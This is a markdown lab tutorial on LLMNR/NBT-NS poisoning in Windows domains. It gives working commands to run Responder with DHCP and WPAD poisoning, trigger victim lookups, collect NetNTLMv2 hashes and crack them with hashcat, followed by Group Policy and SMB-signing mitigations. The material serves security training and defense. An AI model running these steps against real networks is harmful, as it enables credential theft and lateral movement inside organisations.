# 🔓 LLMNR/NBT-NS Poisoning in Windows Domain Environments

> **Category:** Offensive Active Directory
> **Tags:** `LLMNR` `NBT-NS` `Responder` `NTLM Relay` `MITM`

---

## 📖 1. Background

Despite the widespread adoption of cloud technologies, many organizations continue to rely on **Active Directory (AD)** for authentication and resource management.

Misconfigurations within AD environments can expose systems to legacy protocol abuse, including **LLMNR** and **NBT-NS poisoning attacks**, which enable credential interception and relay attacks.

---

## 🧠 2. What Are LLMNR and NBT-NS?

**LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) are fallback name resolution protocols used when DNS resolution fails.

### Windows Name Resolution Order

| Step | Action |
|:---:|---|
| 1 | Check `localhost` |
| 2 | Check `hosts` file (`C:\Windows\System32\drivers\etc\hosts`) |
| 3 | Query configured DNS servers |
| 4 | Send **LLMNR** multicast request |
| 5 | Send **NBT-NS** broadcast request |

### ⚠️ Security Issue

- If DNS resolution fails, the system broadcasts a request on the local network.
- **Any host can respond** to this request, including malicious systems.
- This lack of authentication allows attackers to impersonate legitimate services.

---

## 💥 3. Impact

### Credential Exposure
- Captures **NetNTLMv2 hashes**
- Hashes can be cracked offline to recover plaintext passwords

### Man-in-the-Middle (MITM)
- Intercept and manipulate authentication traffic

### SMB Relay Attacks
- Works when **SMB signing is not enforced**
- No need to crack hashes
- Can result in:
  - Remote command execution
  - Privilege escalation
  - Lateral movement

---

## 🧪 4. Lab Setup and Exploitation

### Step 1 — Install Responder

```bash
apt install responder
```

**Or install from source:**

```bash
git clone https://github.com/SpiderLabs/Responder.git
cd Responder
python3 Responder.py --help
```

---

### Step 2 — Start Responder

```bash
responder -I eth0 -dvw
```

| Flag | Meaning |
|:---:|---|
| `-I eth0` | Network interface to listen on |
| `-d` | Enable DHCP poisoning |
| `-v` | Verbose output |
| `-w` | Start WPAD rogue proxy server |

---

### Step 3 — Trigger Name Resolution

From the **victim machine**, force a failed DNS lookup so it falls back to LLMNR/NBT-NS:

```powershell
ping test.local -t
```

**Or access a non-existent share:**

```powershell
\\test.local
```

> 💡 This forces the system to fall back to LLMNR/NBT-NS, which Responder will answer.

---

### Step 4 — Capture the NetNTLMv2 Hash

Responder stores captured hashes locally:

```bash
cat logs/SMB-NTLMv2-*.txt
```

**Example format:**

```
username::domain:challenge:response:blob
```

**Sample captured hash:**

```
admin::INFOWARRIOR:99e4b3667f3730ae:864D9A7CB6ABBC395FF621683F47604E:0101000000000000...
```

---

### Step 5 — Crack the Hash

**Identify the hash type:**

```bash
hashid <hash>
```

**Crack using Hashcat:**

```bash
hashcat -m 5600 hashes.txt /opt/rockyou.txt
```

**Display cracked credentials:**

```bash
hashcat -m 5600 hashes.txt /opt/rockyou.txt --show
```

---

## 🛡️ Mitigations

- Disable LLMNR via Group Policy: `Computer Configuration → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution`
- Disable NBT-NS on all network interfaces (`WINS` tab → *Disable NetBIOS over TCP/IP*)
- Enforce **SMB signing** on all hosts
- Enforce strong password policies to slow offline cracking
- Monitor for unusual name resolution traffic on the network

---

## 📚 References

- [Responder — SpiderLabs GitHub](https://github.com/SpiderLabs/Responder)
- [Hashcat](https://hashcat.net/hashcat/)
